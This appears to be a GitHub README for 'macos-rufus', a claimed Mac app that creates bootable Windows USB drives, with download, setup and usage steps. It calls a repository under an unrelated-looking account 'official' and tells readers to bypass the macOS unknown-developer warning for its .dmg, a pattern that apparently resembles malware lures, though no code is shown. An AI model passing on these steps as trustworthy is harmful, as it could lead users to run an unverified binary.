# 💾 macos-rufus - Create Windows installation drives on Mac

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/farflung-dearest512/macos-rufus/releases)

This application creates bootable Windows USB drives using your Mac. You do not need virtual machines or Boot Camp software. The tool handles modern UEFI systems and older BIOS hardware. It splits large installation files automatically so Windows 11 installs work on any USB drive.

## 📋 System Requirements

Ensure you meet these requirements before you start:

- A Mac computer running macOS 10.15 or newer.
- An empty USB flash drive with at least 16 GB of space.
- An official Windows ISO file downloaded from the Microsoft website.
- An active internet connection for the initial setup.

## 📥 Downloading the Tool

Follow these steps to acquire the software:

1. Visit the [official release page](https://github.com/farflung-dearest512/macos-rufus).
2. Look for the Assets section at the bottom of the latest release.
3. Select the file ending in .dmg to begin the download.
4. Save the file to your Downloads folder.

## ⚙️ Installation Instructions

Mac applications require a quick setup process:

1. Open the Downloads folder in Finder.
2. Double-click the file you saved to open the disk image.
3. Drag the application icon into your Applications folder.
4. Eject the disk image from your desktop sidebar.
5. Open your Applications folder and click the icon to launch the program.

## 🚀 Creating Your Bootable Drive

Follow these steps to prepare your Windows USB:

1. Insert your USB flash drive into an available port on your Mac.
2. Open the application.
3. Click the Device dropdown menu and select your USB drive. Ensure you choose the correct drive, as this process erases all data on the selected device.
4. Click the Select button under the Boot Selection header. Locate your Windows ISO file on your computer and open it.
5. Choose the Partition Scheme. If you own a modern computer, select GPT. If you own a computer made before 2012, select MBR.
6. Check the Target System field. The software detects the correct setting based on your partition choice.
7. Click the Start button.
8. Wait for the progress bar to reach the end. The software manages file splitting and formatting tasks in the background.

## 🛠️ Understanding Features

This tool offers several capabilities to simplify disk creation:

- Parallel Copying: The application writes multiple files at once to speed up the process.
- Automatic WIM Splitting: Many Windows 11 installation files exceed 4GB. The tool breaks these files into smaller segments so your USB drive remains compatible with standard formats.
- Dual Mode Support: You can choose between UEFI and Legacy BIOS firmware modes depending on your target machine.
- File Verification: The program checks your files after copying to ensure the installation process succeeds on your target computer.

## ❓ Frequently Asked Questions

What happens to the data on my USB drive?
The application reformats the drive to ensure compatibility. All existing files disappear during this process. Move your important files to another location before you start.

Can I use this for Linux?
This tool focuses on Windows installation media. It supports Windows 7 through 11.

Does this tool damage my macOS installation?
The software works only on selected USB drives. It requires your permission to access external hardware. It leaves your system files alone.

Why does my Mac ask to open an app from an unknown developer?
Since you downloaded this from GitHub, macOS acts to protect your security. To proceed, go to System Settings, click Privacy & Security, and select Open Anyway under the Security section.

What if the application freezes during the copy process?
Large Windows files take time to process. Wait at least ten minutes before you close the application. If the progress bar moves, the software works correctly.

## 🛡️ Important Safety Tips

Keep these points in mind for a smooth experience:

- Do not remove the USB drive while the progress bar runs. This causes errors and may force you to start the process again.
- Use a USB 3.0 port if possible to decrease wait times.
- Verify your ISO file integrity before you begin. A corrupted ISO file leads to a failed Windows installation on your target computer.
- Keep your Mac connected to a power source during the process if you use a laptop.